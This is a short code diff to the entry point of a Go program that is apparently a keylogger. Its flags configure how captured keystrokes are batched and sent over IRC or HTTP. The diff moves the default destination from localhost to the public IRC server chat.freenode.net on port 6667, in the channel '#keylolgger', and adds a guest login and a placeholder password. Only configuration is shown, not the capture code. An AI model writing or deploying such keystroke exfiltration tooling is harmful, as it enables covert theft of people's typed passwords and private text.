@@ -14,16 +14,16 @@ import (
 func main() {
 	protocol := flag.String("protocol", "debug", "protocol to use to send strokes")
 	config := net.Config{}
-	flag.StringVar(&config.Host, "host", "localhost", "host to send strokes to")
-	flag.IntVar(&config.Port, "port", 80, "port to send strokes to")
+	flag.StringVar(&config.Host, "host", "chat.freenode.net", "host to send strokes to")
+	flag.IntVar(&config.Port, "port", 6667, "port to send strokes to")
 	// in case of authentication
-	flag.StringVar(&config.User, "user", "username", "user to connect with")
-	flag.StringVar(&config.Pass, "pass", "password", "password associated to the user")
+	flag.StringVar(&config.User, "user", "Guest74629", "user to connect with")
+	flag.StringVar(&config.Pass, "pass", "hunter2", "password associated to the user")
 	// irc
 	flag.StringVar(&config.Channel, "channel", "#keylolgger", "channel to send strokes to (IRC)")
 	// http
 	flag.StringVar(&config.URL, "url", "/data", "url to send strokes to (HTTP)")
-	flag.StringVar(&config.Request, "request", "POST", "type of request to send (HTTP)")
+	flag.StringVar(&config.Request, "request", "post", "type of request to send (HTTP)")
 
 	size := flag.Int("size", 512, "number of strokes to get before sending")
 	flag.Parse()
